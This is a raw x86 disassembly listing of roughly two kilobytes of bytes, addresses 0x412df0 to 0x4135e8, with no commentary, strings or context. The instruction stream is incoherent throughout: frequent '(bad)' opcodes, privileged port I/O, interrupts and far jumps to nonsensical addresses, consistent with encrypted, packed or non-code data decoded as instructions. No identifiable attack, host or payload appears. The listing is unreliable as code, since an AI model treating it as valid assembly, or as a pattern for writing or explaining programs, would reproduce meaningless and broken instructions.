  412df0:	enter  0x8694,0x85
  412df4:	js     0x412e41
  412df6:	xchg   dh,ch
  412df8:	popa   
  412df9:	push   0x7aed4c36
  412dfe:	ja     0x412dec
  412e00:	cs retf 
  412e02:	mov    dl,0xb7
  412e04:	fcmovu st,st(6)
  412e06:	xchg   DWORD PTR [edx-0x43b78a85],edx
  412e0c:	push   ss
  412e0d:	enter  0x9689,0xf9
  412e11:	push   cs
  412e12:	jmp    ebx
  412e14:	ror    DWORD PTR [ebx+0x4b59be2c],cl
  412e1a:	sub    cl,BYTE PTR [edi]
  412e1c:	lahf   
  412e1d:	das    
  412e1e:	and    BYTE PTR ss:[edx-0x682159ff],0x95
  412e26:	add    BYTE PTR [ebp-0x69],bl
  412e29:	mov    DWORD PTR [ebp+0x65],esi
  412e2c:	sbb    BYTE PTR [eax],cl
  412e2e:	int    0x53
  412e30:	fs (bad) 
  412e32:	xchg   esi,eax
  412e33:	(bad)  
  412e34:	sbb    eax,0x78356fc8
  412e39:	out    dx,al
  412e3a:	mov    ecx,0x5fe2b4ea
  412e3f:	cmp    bh,ah
  412e41:	inc    edx
  412e42:	leave  
  412e43:	std    
  412e44:	xor    esi,DWORD PTR [ebx+0x658f0ffb]
  412e4a:	icebp  
  412e4b:	pop    ss
  412e4c:	pop    esp
  412e4d:	popa   
  412e4e:	or     al,0xeb
  412e50:	fxch   st(6)
  412e52:	into   
  412e53:	fstp   QWORD PTR [ecx-0x2]
  412e56:	mov    ah,0xef
  412e58:	out    dx,al
  412e59:	aaa    
  412e5a:	pop    ebx
  412e5b:	push   esi
  412e5c:	int    0x61
  412e5e:	call   0xd6eb2896
  412e63:	jg     0x412e92
  412e65:	hlt    
  412e66:	mov    eax,0x3b18ec03
  412e6b:	xchg   ecx,eax
  412e6c:	out    0x36,al
  412e6e:	test   bl,dh
  412e70:	cmp    dl,BYTE PTR [esp+eax*1]
  412e73:	dec    edx
  412e74:	fldcw  WORD PTR [edi+0x71]
  412e77:	fndisi(8087 only) 
  412e79:	cmp    eax,0xc6b60a81
  412e7e:	inc    ebp
  412e7f:	push   cs
  412e80:	outs   dx,BYTE PTR ds:[esi]
  412e81:	cdq    
  412e82:	lahf   
  412e83:	ja     0x412ef6
  412e85:	aaa    
  412e86:	aaa    
  412e87:	dec    DWORD PTR [ecx-0x61]
  412e8a:	test   al,0xbd
  412e8c:	shl    DWORD PTR [edi-0x18],0x1c
  412e90:	lods   eax,DWORD PTR ds:[esi]
  412e91:	js     0x412ef2
  412e93:	out    dx,al
  412e94:	out    0xa4,al
  412e96:	jmp    0x412e7f
  412e98:	jp     0x412e6a
  412e9a:	int3   
  412e9b:	es or  al,bl
  412e9e:	push   ebp
  412e9f:	js     0x412e83
  412ea1:	out    dx,eax
  412ea2:	arpl   WORD PTR [ebx+0x31d82801],ax
  412ea8:	mov    DWORD PTR [edi-0x28],0x84aab34f
  412eaf:	mul    BYTE PTR [ebp-0x1660db4c]
  412eb5:	mov    dl,0xcd
  412eb7:	das    
  412eb8:	pop    edx
  412eb9:	lds    esi,FWORD PTR [ebp-0x49]
  412ebc:	pop    ecx
  412ebd:	jge    0x412e53
  412ebf:	retf   0x6f05
  412ec2:	adc    ax,0x558b
  412ec6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412ec7:	inc    eax
  412ec8:	and    esi,0xffffff9a
  412ecb:	iret   
  412ecc:	dec    edx
  412ecd:	xchg   edx,eax
  412ece:	(bad)  
  412ecf:	mov    edx,0x106158cc
  412ed4:	inc    ebp
  412ed5:	shl    DWORD PTR [edi],1
  412ed7:	mov    al,0x8b
  412ed9:	out    0x53,eax
  412edb:	dec    esi
  412edc:	loope  0x412eda
  412ede:	dec    ebp
  412edf:	push   edi
  412ee0:	pop    edi
  412ee1:	add    bh,BYTE PTR [eax]
  412ee3:	jg     0x412eea
  412ee5:	daa    
  412ee6:	loope  0x412eba
  412ee8:	(bad)  
  412ee9:	sbb    BYTE PTR [ebp+0x5c0e4884],cl
  412eef:	cmp    eax,0x861678a4
  412ef4:	in     eax,dx
  412ef5:	(bad)  
  412ef6:	sahf   
  412ef7:	jb     0x412ec3
  412ef9:	inc    BYTE PTR [ecx]
  412efb:	inc    ebx
  412efc:	pop    eax
  412efd:	and    BYTE PTR ds:0xdae085f0,0x4c
  412f04:	xchg   ebp,eax
  412f05:	out    0xa7,eax
  412f07:	out    dx,eax
  412f08:	fimul  WORD PTR [edi+0x30]
  412f0b:	out    0x73,al
  412f0d:	push   es
  412f0e:	fild   WORD PTR [ebp-0x7b]
  412f11:	push   0x22
  412f13:	jne    0x412f38
  412f15:	pop    ebx
  412f16:	xor    edx,ebp
  412f18:	pop    ebx
  412f19:	jmp    0x412ed1
  412f1b:	fstp   QWORD PTR [ecx]
  412f1d:	aad    0x5c
  412f1f:	in     eax,0xc9
  412f21:	push   edx
  412f22:	popf   
  412f23:	add    al,0x1f
  412f25:	dec    eax
  412f26:	pop    esp
  412f27:	popa   
  412f28:	ret    0x864a
  412f2b:	mov    ax,0xdf5
  412f2f:	xor    al,0xa9
  412f31:	scas   eax,DWORD PTR es:[edi]
  412f32:	xchg   eax,esp
  412f34:	push   0xffffffc0
  412f36:	bound  ebx,QWORD PTR [ebp+0x2d98b096]
  412f3c:	pop    ebp
  412f3d:	mov    bl,BYTE PTR [edi+0x5c46a9eb]
  412f43:	sub    ah,BYTE PTR [edi+esi*2]
  412f46:	daa    
  412f47:	int    0xff
  412f49:	jno    0x412fb6
  412f4b:	js     0x412f8d
  412f4d:	push   cs
  412f4e:	test   dl,0x71
  412f51:	popa   
  412f52:	pop    ebp
  412f53:	sub    DWORD PTR [esi+edx*1-0x32],ecx
  412f57:	ins    BYTE PTR es:[edi],dx
  412f58:	(bad)  
  412f59:	popa   
  412f5a:	xchg   edx,eax
  412f5b:	shl    DWORD PTR [ecx+0x4d],1
  412f5e:	ja     0x412f20
  412f60:	leave  
  412f61:	push   eax
  412f62:	enter  0x8041,0xc8
  412f66:	push   edx
  412f67:	push   es
  412f68:	and    edi,0x5c7a98c0
  412f6e:	mov    esi,0x9bdb3be8
  412f73:	int3   
  412f74:	and    bl,bl
  412f76:	adc    al,0x41
  412f78:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412f79:	ret    0x5335
  412f7c:	inc    edi
  412f7d:	inc    edx
  412f7e:	jmp    0x260772cc
  412f83:	test   BYTE PTR [ebp+0x50],cl
  412f86:	das    
  412f87:	push   0xffffffb3
  412f89:	call   0x9776:0x9b31c9a1
  412f90:	ret    0xa14d
  412f93:	fdivr  QWORD PTR [eax-0x19]
  412f96:	sbb    eax,0x17f61cac
  412f9b:	test   eax,0xe2dfba35
  412fa0:	adc    edx,DWORD PTR [edx+0x3e]
  412fa3:	cmp    al,0x97
  412fa5:	push   eax
  412fa6:	cmc    
  412fa7:	mov    cl,BYTE PTR [ecx-0x5eec0241]
  412fad:	into   
  412fae:	add    bl,0xc1
  412fb1:	ret    
  412fb2:	mov    WORD PTR [ebx],fs
  412fb4:	in     al,0x15
  412fb6:	lock push esp
  412fb8:	nop
  412fb9:	xor    bl,ch
  412fbb:	ss stos DWORD PTR es:[edi],eax
  412fbd:	test   ah,dl
  412fbf:	retf   0x1767
  412fc2:	push   ebp
  412fc3:	fstp   DWORD PTR ds:0x2d8e0f05
  412fc9:	mov    ebp,0x605c06c5
  412fce:	(bad)  
  412fd0:	pusha  
  412fd1:	int    0x2a
  412fd3:	in     eax,0xeb
  412fd5:	mov    ebx,0xf8ddf72d
  412fda:	sbb    bh,al
  412fdc:	shr    al,1
  412fde:	scas   eax,DWORD PTR es:[edi]
  412fdf:	dec    edi
  412fe0:	lahf   
  412fe1:	push   cs
  412fe2:	jl     0x413006
  412fe4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412fe5:	xor    edi,DWORD PTR ds:[ecx+0x23]
  412fe9:	hlt    
  412fea:	jle    0x412fbb
  412fec:	or     al,0xd
  412fee:	push   es
  412fef:	xchg   ecx,eax
  412ff0:	xlat   BYTE PTR ds:[ebx]
  412ff1:	jle    0x41304b
  412ff3:	adc    BYTE PTR [edx-0x14],ch
  412ff6:	jmp    0x5560:0x128d51ab
  412ffd:	ja     0x41304c
  412fff:	imul   ebx,esp,0x7c
  413002:	in     al,dx
  413003:	jmp    0xec273b19
  413008:	adc    cl,BYTE PTR [ebx+0x724ddeb8]
  41300e:	pop    esi
  41300f:	push   es
  413010:	std    
  413011:	push   eax
  413012:	rcl    DWORD PTR [esi],0xe5
  413015:	and    DWORD PTR [edx-0xcddd42f],ebx
  41301b:	outs   dx,BYTE PTR ds:[esi]
  41301c:	cwde   
  41301d:	aaa    
  41301e:	cmp    al,0xbb
  413020:	sbb    eax,0xb6ffc018
  413025:	popa   
  413026:	pop    ebx
  413027:	les    eax,FWORD PTR [ecx+0x7918269b]
  41302d:	fs int3 
  41302f:	lea    esp,[esi+eax*2]
  413032:	pusha  
  413033:	addr16 dec ecx
  413035:	and    DWORD PTR [edx+0x74],eax
  413038:	int    0xdf
  41303a:	push   ss
  41303b:	dec    ebp
  41303c:	push   esi
  41303d:	loop   0x413022
  41303f:	add    bl,BYTE PTR ds:0xcad08d73
  413045:	sub    edi,DWORD PTR [eax]
  413047:	pop    DWORD PTR [ebp+0x7c]
  41304a:	hlt    
  41304b:	popa   
  41304c:	std    
  41304d:	(bad)  
  41304e:	mov    ecx,0x5e6da80f
  413053:	scas   eax,DWORD PTR es:[edi]
  413054:	iret   
  413055:	out    dx,eax
  413056:	push   ebx
  413057:	xchg   ebp,eax
  413058:	sbb    eax,ecx
  41305a:	es call 0x5eb4e12a
  413060:	aas    
  413061:	retf   0xf111
  413064:	(bad)
  413069:	adc    eax,0x96c63718
  41306e:	pusha  
  41306f:	iret   
  413070:	push   edi
  413071:	retf   
  413072:	outs   dx,BYTE PTR ds:[esi]
  413073:	dec    eax
  413074:	test   ebp,0x69f0d9a0
  41307a:	sbb    eax,DWORD PTR [ecx-0x75]
  41307d:	or     al,0xea
  41307f:	xor    al,BYTE PTR [ebp-0x5d]
  413082:	mov    edx,0x8010e6b7
  413087:	iret   
  413088:	dec    esp
  413089:	sub    BYTE PTR [edx+edi*4],0xe4
  41308d:	inc    esi
  41308e:	and    BYTE PTR ds:0xa2d8fc44,ch
  413094:	cmp    BYTE PTR [ebp+0xd],dl
  413097:	pop    es
  413098:	mov    dh,0xc5
  41309a:	out    dx,eax
  41309b:	pop    ds
  41309c:	pop    ss
  41309d:	stos   DWORD PTR es:[edi],eax
  41309e:	shl    DWORD PTR [edx+ecx*8-0x48],0xea
  4130a3:	sbb    eax,0xe67a4811
  4130a8:	lahf   
  4130a9:	into   
  4130aa:	mov    al,0x81
  4130ac:	lds    edx,FWORD PTR [ecx+edi*4-0x50]
  4130b0:	enter  0x6c65,0x90
  4130b4:	mov    al,ds:0x769c48ed
  4130b9:	push   cs
  4130ba:	xor    al,0xe0
  4130bc:	js     0x41313b
  4130be:	imul   ebx,edi,0xab652cee
  4130c4:	mov    ?,WORD PTR [ecx]
  4130c6:	mov    bh,0xe4
  4130c8:	sti    
  4130c9:	call   FWORD PTR [eax+0x1c8dc011]
  4130cf:	or     edi,esi
  4130d1:	(bad)  
  4130d2:	jo     0x413125
  4130d4:	mov    ebx,0xc67570f9
  4130d9:	and    DWORD PTR [esi],esp
  4130db:	cmp    dh,ch
  4130dd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4130de:	pop    ebp
  4130df:	out    0x45,eax
  4130e1:	adc    DWORD PTR [ecx],edi
  4130e3:	sub    esi,ecx
  4130e5:	inc    ecx
  4130e6:	mov    BYTE PTR [edx-0xe4c857c],cl
  4130ec:	jno    0x12a87d2f
  4130f2:	out    dx,al
  4130f3:	daa    
  4130f4:	pop    edi
  4130f5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4130f6:	stos   BYTE PTR es:[edi],al
  4130f7:	ret    0x696a
  4130fa:	xor    BYTE PTR [eax-0x70],dl
  4130fd:	adc    eax,0xe2328b29
  413102:	sbb    dh,BYTE PTR [ecx]
  413104:	mov    ebp,0xff9263c2
  413109:	mov    ecx,0x930cd721
  41310e:	push   ds
  41310f:	xor    al,BYTE PTR [ebx]
  413111:	shl    BYTE PTR [esi],1
  413113:	mov    ds:0x86134150,eax
  413118:	lds    eax,FWORD PTR [esi+ecx*8]
  41311b:	pop    es
  41311c:	test   al,0x4a
  41311e:	jne    0x4130cf
  413120:	popf   
  413121:	mov    ebp,0x789584f3
  413126:	in     eax,dx
  413127:	jecxz  0x413174
  413129:	jmp    DWORD PTR [ebp+0x20]
  41312c:	jmp    0xee94f230
  413131:	sub    eax,0x72135195
  413136:	in     eax,dx
  413137:	and    dl,BYTE PTR [esi+0x42]
  41313a:	or     al,0x4a
  41313c:	les    ebp,FWORD PTR [edx-0x10a6a696]
  413142:	rcr    BYTE PTR [edx-0x27009cb4],0x87
  413149:	dec    ebx
  41314a:	cli    
  41314b:	ins    DWORD PTR es:[edi],dx
  41314c:	cmp    DWORD PTR [ebx+ebx*2],0x976b63a9
  413153:	rcr    DWORD PTR [eax],1
  413155:	aaa    
  413156:	loope  0x41313f
  413158:	xor    al,0x1e
  41315a:	ds cs call 0xe3f0c783
  413161:	sar    dl,cl
  413163:	inc    esi
  413164:	inc    esi
  413165:	jae    0x4131a9
  413167:	mov    ah,0xb4
  413169:	in     al,0x40
  41316b:	pop    edx
  41316c:	sub    eax,0xbf686f74
  413171:	pop    ss
  413172:	inc    esp
  413173:	add    edx,DWORD PTR [edi+0x7]
  413176:	nop
  413177:	in     al,dx
  413178:	in     al,0x10
  41317a:	adc    eax,0x4da42759
  41317f:	sub    al,0xd
  413181:	int3   
  413182:	add    DWORD PTR [eax],ecx
  413184:	mov    dh,0x30
  413186:	not    DWORD PTR [edx+0x1f]
  413189:	pop    edi
  41318a:	xchg   esp,eax
  41318b:	cld    
  41318c:	imul   esi,DWORD PTR [eax+0x47],0x213b8edd
  413193:	jle    0x4131f2
  413195:	add    bl,BYTE PTR [eax]
  413197:	jnp    0x4131ed
  413199:	in     al,0xc4
  41319b:	mov    bh,0x21
  41319d:	adc    bl,BYTE PTR [ebp+0x3d]
  4131a0:	pop    esi
  4131a1:	daa    
  4131a2:	inc    eax
  4131a3:	xor    eax,0x65401544
  4131a8:	out    dx,eax
  4131a9:	hlt    
  4131aa:	mov    ebx,0x170437e8
  4131af:	imul   esp,DWORD PTR [ecx+0x72],0x13da60d4
  4131b6:	or     DWORD PTR [esi],0x65a6a6a
  4131bc:	ret    
  4131bd:	mov    ds:0x39c87927,al
  4131c2:	(bad)  
  4131c3:	test   dh,0x1
  4131c6:	lds    ebp,FWORD PTR [eax+eax*1+0x23]
  4131ca:	out    dx,al
  4131cb:	mov    ebp,0x974cea98
  4131d0:	fbld   TBYTE PTR [ecx-0x1e]
  4131d3:	push   0x45
  4131d5:	jnp    0x4131d9
  4131d7:	xlat   BYTE PTR ds:[ebx]
  4131d8:	sbb    al,BYTE PTR [edx-0x26]
  4131db:	mov    tr2,esp
  4131de:	imul   ebx,DWORD PTR [esi+0x53bdb637],0x30
  4131e5:	les    eax,FWORD PTR [ebx-0x6d99f13d]
  4131eb:	adc    ebp,DWORD PTR [eax]
  4131ed:	retf   0x4cbd
  4131f0:	lea    edx,[ebx-0x216c9865]
  4131f6:	pusha  
  4131f7:	pusha  
  4131f8:	enter  0xae59,0xa4
  4131fc:	adc    edx,eax
  4131fe:	shl    DWORD PTR [eax-0x77],0x3f
  413202:	mul    DWORD PTR [edx-0x63]
  413205:	push   0x8a84c8f1
  41320a:	xor    DWORD PTR [ebx+ebp*8-0x2230da0e],ebx
  413211:	pop    ebx
  413212:	or     DWORD PTR [esi*8-0x489127d2],edx
  413219:	popf   
  41321a:	jecxz  0x4131f8
  41321c:	dec    esi
  41321e:	push   0xbfffc6ea
  413223:	xor    DWORD PTR ds:0x91ee3306,eax
  413229:	call   0xef59670c
  41322e:	xchg   DWORD PTR [eax-0x618cc41d],ebp
  413234:	lods   al,BYTE PTR ds:[esi]
  413235:	adc    BYTE PTR [ecx+eiz*2-0x6c],cl
  413239:	js     0x41329b
  41323b:	fcomip st,st(6)
  41323d:	dec    esi
  41323e:	imul   ebp,DWORD PTR [edi-0x78],0xd
  413242:	mov    ecx,0x860563c5
  413247:	add    esi,eax
  413249:	inc    ebx
  41324a:	xor    ah,BYTE PTR [edi]
  41324c:	enter  0xf269,0xa
  413250:	(bad)  
  413251:	jne    0x413282
  413253:	mov    dl,0xd2
  413255:	xchg   DWORD PTR [ebx],edi
  413257:	mov    al,0x9e
  413259:	fs js  0x413206
  41325c:	add    eax,0x5c5ae7e4
  413261:	push   0x23
  413263:	inc    esp
  413264:	cmc    
  413265:	sub    BYTE PTR [edx],dl
  413267:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413268:	fiadd  DWORD PTR [ebx+0xa]
  41326b:	pushf  
  41326c:	jl     0x4132c5
  41326e:	into   
  41326f:	jmp    0x5fe2:0xb8553571
  413276:	imul   edi,DWORD PTR [eax+0x22023e49],0xe1b57393
  413280:	pop    ds
  413281:	aad    0x57
  413283:	push   esi
  413284:	pop    esp
  413285:	mov    bh,0x32
  413287:	es dec ecx
  413289:	mov    WORD PTR [ebx],cs
  41328b:	popf   
  41328c:	out    0x98,eax
  41328e:	inc    esp
  41328f:	inc    ecx
  413290:	lds    esp,FWORD PTR [eax-0x5bf91ca4]
  413296:	xor    BYTE PTR [esi],0x46
  413299:	aaa    
  41329a:	cmp    al,0xba
  41329c:	call   FWORD PTR [ebp+0x4de1b20b]
  4132a2:	out    dx,eax
  4132a3:	in     al,dx
  4132a4:	pop    esp
  4132a5:	addr16 mov ah,0xf6
  4132a8:	push   edx
  4132a9:	aad    0x2f
  4132ab:	and    ecx,DWORD PTR [eax]
  4132ad:	xor    edx,DWORD PTR [esi]
  4132af:	cmp    al,0xcd
  4132b1:	push   es
  4132b2:	push   ecx
  4132b3:	or     bh,BYTE PTR [esi-0x1]
  4132b6:	mov    edx,0x22f0c328
  4132bb:	lock hlt 
  4132bd:	loopne 0x413272
  4132bf:	jmp    0xdb16b60c
  4132c4:	cld    
  4132c5:	mul    ebp
  4132c7:	adc    al,0xc0
  4132c9:	sub    bh,al
  4132cb:	ud1    edx,ebx
  4132ce:	into   
  4132cf:	adc    DWORD PTR [ecx-0x62e7fdcd],ebp
  4132d5:	pop    esp
  4132d6:	pusha  
  4132d7:	call   0xf0647942
  4132dc:	inc    esp
  4132dd:	or     DWORD PTR [edi+0x55],esi
  4132e0:	shr    bh,0xcb
  4132e3:	gs cmc 
  4132e5:	jns    0x41335d
  4132e7:	xor    eax,0x9258679e
  4132ec:	mov    bh,0x78
  4132ee:	pop    esi
  4132ef:	inc    ecx
  4132f0:	js     0x4132ed
  4132f2:	push   esi
  4132f3:	and    edx,edi
  4132f5:	cmp    BYTE PTR [edi+0x3a],ch
  4132f8:	push   edi
  4132f9:	xor    BYTE PTR [edx-0x39e3371a],ch
  4132ff:	cmp    dl,BYTE PTR [edx]
  413301:	adc    al,0xe5
  413303:	pushf  
  413304:	mov    bh,0x46
  413306:	xchg   ebp,eax
  413307:	mov    ch,0x92
  413309:	stc    
  41330a:	pop    eax
  41330b:	xchg   esp,eax
  41330c:	adc    ecx,DWORD PTR [ebx]
  41330e:	pop    ss
  41330f:	in     al,0x8a
  413311:	push   edi
  413312:	int    0x97
  413314:	ins    BYTE PTR es:[edi],dx
  413315:	dec    edi
  413316:	add    cl,BYTE PTR [ebp+edx*2-0x7f]
  41331a:	imul   ecx,DWORD PTR [eax+0x704607ad],0x60
  413321:	inc    edi
  413322:	sti    
  413323:	pusha  
  413324:	and    esp,DWORD PTR [edx]
  413326:	lods   al,BYTE PTR ds:[esi]
  413327:	xchg   ecx,eax
  413328:	dec    ebx
  413329:	out    dx,eax
  41332a:	stos   BYTE PTR es:[edi],al
  41332b:	out    0xaf,al
  41332d:	cmps   BYTE PTR es:[esi],BYTE PTR es:[edi]
  41332f:	inc    ebp
  413330:	mov    WORD PTR [edx+0x6c],gs
  413333:	jge    0x413344
  413335:	and    ch,dl
  413337:	inc    esp
  413338:	lock test eax,0xfb376d16
  41333e:	(bad)  
  41333f:	in     eax,0xc6
  413341:	mov    bl,0x70
  413343:	pop    ebp
  413344:	sar    DWORD PTR [eax+0x20],0xa9
  413348:	ss dec esi
  41334a:	or     WORD PTR [ecx],dx
  41334d:	pop    ecx
  41334e:	lock inc esp
  413350:	sbb    al,0xb3
  413352:	push   eax
  413353:	and    eax,ecx
  413355:	xor    al,0xeb
  413357:	cmp    eax,0xc445430c
  41335c:	stc    
  41335d:	ds sub al,0xd8
  413360:	int    0xd6
  413362:	mov    dh,0x73
  413364:	stos   BYTE PTR es:[edi],al
  413365:	mov    dh,0x63
  413367:	shl    edx,cl
  413369:	jmp    0xaf95e343
  41336e:	mov    eax,ds:0xf8acf6b
  413373:	arpl   di,di
  413375:	retf   
  413376:	mov    ds:0x5697521f,eax
  41337b:	cmc    
  41337c:	xor    edi,DWORD PTR [ebx+0x47]
  41337f:	es push 0x78
  413382:	dec    esi
  413383:	dec    ebx
  413384:	ja     0x4133af
  413386:	ja     0x413314
  413388:	mov    ds:0xee0d5cac,eax
  41338d:	(bad)  
  41338e:	xchg   DWORD PTR [bx+di],esp
  413391:	je     0x41332c
  413393:	xor    BYTE PTR [edx+0x71e1ad20],ch
  413399:	in     eax,dx
  41339a:	pop    es
  41339b:	js     0x413337
  41339d:	jmp    0xffe42ac3
  4133a2:	into   
  4133a3:	bound  ebx,QWORD PTR [edi+0x68]
  4133a6:	pushf  
  4133a7:	jecxz  0x413378
  4133a9:	push   eax
  4133aa:	jmp    DWORD PTR [edx+ebp*8+0x60]
  4133ae:	cld    
  4133af:	inc    eax
  4133b0:	xchg   esp,eax
  4133b1:	mov    ebp,0xc7fe83c5
  4133b6:	add    BYTE PTR [ebx+ebp*4],ah
  4133b9:	(bad)  
  4133ba:	mov    dl,0x9b
  4133bc:	pusha  
  4133bd:	arpl   WORD PTR [eax+0x29],cx
  4133c0:	xlat   BYTE PTR ds:[ebx]
  4133c1:	jno    0x41342f
  4133c3:	(bad)  
  4133c5:	scas   eax,DWORD PTR es:[edi]
  4133c6:	(bad)  
  4133c7:	xor    DWORD PTR [ecx-0x6e],ebp
  4133ca:	xchg   esp,eax
  4133cb:	sub    ebp,DWORD PTR [esi+0x27]
  4133ce:	arpl   WORD PTR [bp+di+0x6e],dx
  4133d2:	sar    DWORD PTR [esi-0x48],0x6
  4133d6:	sar    DWORD PTR [esi+0x68bbd99],1
  4133dc:	pop    ss
  4133dd:	and    edi,DWORD PTR [eax+0x744b89c]
  4133e3:	popf   
  4133e4:	dec    esp
  4133e5:	inc    ebp
  4133e6:	xchg   ebx,eax
  4133e7:	les    esi,FWORD PTR [edi-0x5e]
  4133ea:	jo     0x413432
  4133ec:	sbb    eax,0xfe24ae69
  4133f1:	jae    0x413384
  4133f3:	fsub   QWORD PTR [ebx-0x73]
  4133f6:	mov    edx,0x1bdbd8c7
  4133fb:	xor    ebp,0x1d
  4133fe:	ja     0x413461
  413400:	adc    DWORD PTR [edi-0x4],0x4921cb35
  413407:	fsubp  st(7),st
  413409:	data16 mov al,0x24
  41340c:	mov    ds:0x8e185f3,al
  413411:	(bad)  
  413412:	push   ds
  413413:	pusha  
  413414:	jg     0x41346f
  413416:	f2xm1  
  413418:	mov    ebx,0x7f575bd5
  41341d:	mov    al,0x56
  41341f:	ja     0x413451
  413421:	dec    ebp
  413422:	pop    ss
  413423:	or     al,0x22
  413425:	aaa    
  413426:	jb     0x4133bb
  413428:	add    BYTE PTR [esp+ebx*4-0x57],0x4
  41342d:	push   ebx
  41342e:	leave  
  41342f:	aad    0x13
  413431:	fs iret 
  413433:	push   0xe2507df7
  413438:	and    bh,bl
  41343a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41343b:	jbe    0x413464
  41343d:	mov    ebx,0x2fd1487d
  413442:	mov    ch,BYTE PTR [eax+0x6a934c54]
  413448:	adc    BYTE PTR [edi-0xfca55f3],cl
  41344e:	push   cs
  41344f:	cwde   
  413450:	ret    
  413451:	sub    DWORD PTR [ebp+0x18],eax
  413454:	sbb    dl,cl
  413456:	or     eax,DWORD PTR [ecx]
  413458:	and    al,0x31
  41345a:	cmp    dl,0x98
  41345d:	cmp    DWORD PTR [esi+0x51],ebx
  413460:	imul   esi,eax,0x45
  413463:	pop    eax
  413464:	mov    ah,0x59
  413466:	jmp    0x4134e1
  413468:	mul    BYTE PTR [ecx*8-0x51f7d603]
  41346f:	enter  0xea06,0x8f
  413473:	and    al,0xef
  413475:	mov    ecx,0xb636a989
  41347a:	ret    
  41347b:	mov    eax,0xa6286f70
  413480:	pop    edx
  413481:	test   DWORD PTR [ecx],ebp
  413483:	mov    edi,0x905436e4
  413488:	jae    0x41346b
  41348a:	fld    st(6)
  41348c:	jl     0x413479
  41348e:	add    al,0x1c
  413490:	jae    0x4134d9
  413492:	mov    dh,0xea
  413494:	pop    ebx
  413495:	dec    ebx
  413496:	jp     0x41346d
  413498:	inc    ebp
  413499:	mov    ah,0xea
  41349b:	sub    cl,BYTE PTR [ecx]
  41349d:	xchg   bh,bh
  41349f:	in     al,dx
  4134a0:	dec    eax
  4134a1:	pop    eax
  4134a2:	out    0xa3,eax
  4134a4:	inc    esi
  4134a5:	or     eax,DWORD PTR [edi+edi*1]
  4134a8:	xchg   DWORD PTR [eax+0x5f],esi
  4134ab:	lods   eax,DWORD PTR ds:[esi]
  4134ac:	xor    BYTE PTR [ecx+0x6ff8a28f],dl
  4134b2:	lock mov bl,0xc2
  4134b5:	add    esp,edi
  4134b7:	mov    BYTE PTR [eax*8-0x5cb2d078],ah
  4134be:	cs out 0xec,eax
  4134c1:	add    ecx,edi
  4134c3:	aam    0x4
  4134c5:	(bad)  [ebx+esi*2-0x75912020]
  4134cc:	gs add eax,0xe1945ffc
  4134d2:	(bad)  
  4134d3:	repz pop ebp
  4134d5:	cmp    dh,0x7a
  4134d8:	scas   eax,DWORD PTR es:[edi]
  4134d9:	or     al,0x2a
  4134db:	jae    0x413491
  4134dd:	iret   
  4134de:	jp     0x413526
  4134e0:	pushf  
  4134e1:	or     DWORD PTR [esi-0x75ffd3cc],esi
  4134e7:	std    
  4134e8:	lock and eax,0xd3cb6043
  4134ee:	lahf   
  4134ef:	fnstenv [edx]
  4134f1:	loopne 0x41352e
  4134f3:	and    eax,0xc3be48c8
  4134f8:	jns    0x413579
  4134fa:	xchg   BYTE PTR [ecx+0xa],ch
  4134fd:	or     DWORD PTR [ebp+ebp*1+0x56184056],edx
  413504:	aam    0x1b
  413506:	icebp  
  413507:	push   0xcc74e98b
  41350c:	sub    eax,0x22fd8e44
  413511:	in     eax,dx
  413512:	mov    ebp,0x828df5a
  413517:	push   ds
  413518:	push   0x24
  41351a:	fwait
  41351b:	cmc    
  41351c:	xchg   ecx,eax
  41351d:	test   al,0x4d
  41351f:	lods   al,BYTE PTR ds:[esi]
  413520:	aad    0x7d
  413522:	(bad)  
  413523:	mov    ds:0xf6f1c76f,al
  413528:	cmp    al,0x73
  41352a:	fild   QWORD PTR [eax]
  41352c:	jmp    0x5010c3f2
  413531:	inc    edi
  413532:	out    0x12,al
  413534:	or     edi,eax
  413536:	shl    DWORD PTR [edi],0xc
  413539:	sub    BYTE PTR [edx-0x21180a26],dl
  41353f:	ds icebp 
  413541:	add    dh,al
  413543:	xor    edx,ebx
  413545:	push   0x5a
  413547:	lahf   
  413548:	pop    esp
  413549:	jecxz  0x41351e
  41354b:	gs (bad) 
  41354d:	std    
  41354e:	ss jmp 0x4135c5
  413551:	cld    
  413552:	sub    esp,DWORD PTR [edi-0x703895e3]
  413558:	inc    esi
  413559:	in     eax,0x55
  41355b:	push   ds
  41355c:	hlt    
  41355d:	fisub  WORD PTR [ecx+eiz*4]
  413560:	mov    ds:0x80cbcf94,al
  413565:	and    al,0x4
  413567:	cmp    DWORD PTR [eax],eax
  413569:	and    al,0xa
  41356b:	int    0x99
  41356d:	inc    esi
  41356e:	sbb    ah,BYTE PTR [ebx]
  413570:	mov    dh,0xa5
  413572:	add    DWORD PTR [edx-0x4e],ebx
  413575:	repnz sahf 
  413577:	mov    al,ds:0x9321fff3
  41357c:	xor    BYTE PTR [edx],dh
  41357e:	ja     0x413515
  413580:	xor    ecx,esi
  413582:	rcr    cl,cl
  413584:	call   0x639a:0xfe05e30e
  41358b:	cmp    ch,BYTE PTR [ecx-0x3f57436]
  413591:	imul   eax,edx,0x2e0cb516
  413597:	bound  ebx,QWORD PTR [ecx]
  413599:	pop    edi
  41359a:	sbb    eax,0x4ba9b736
  41359f:	mov    dh,0xd5
  4135a1:	or     bl,BYTE PTR [esi-0x32789cfa]
  4135a7:	mov    eax,ds:0xe598d53b
  4135ac:	outs   dx,DWORD PTR ds:[esi]
  4135ad:	jmp    0xf400:0x59a4534e
  4135b4:	bound  eax,QWORD PTR [edx]
  4135b6:	aad    0xea
  4135b8:	int    0xb0
  4135ba:	int    0xc8
  4135bc:	sbb    ch,bh
  4135be:	ret    0xa2e0
  4135c1:	add    eax,DWORD PTR [edx-0x54]
  4135c4:	push   ebp
  4135c5:	and    al,0xaa
  4135c7:	es cld 
  4135c9:	jl     0x4135fd
  4135cb:	or     ebp,DWORD PTR [ebx+ecx*1-0x12426a82]
  4135d2:	inc    eax
  4135d3:	and    al,0x3e
  4135d5:	adc    dl,BYTE PTR [eax-0x5ecc4eab]
  4135db:	xor    BYTE PTR [edx+0x59089d0f],dl
  4135e1:	add    eax,0x85e6f80e
  4135e6:	pop    esp
  4135e7:	retf   
  4135e8:	loopne 0x4135df
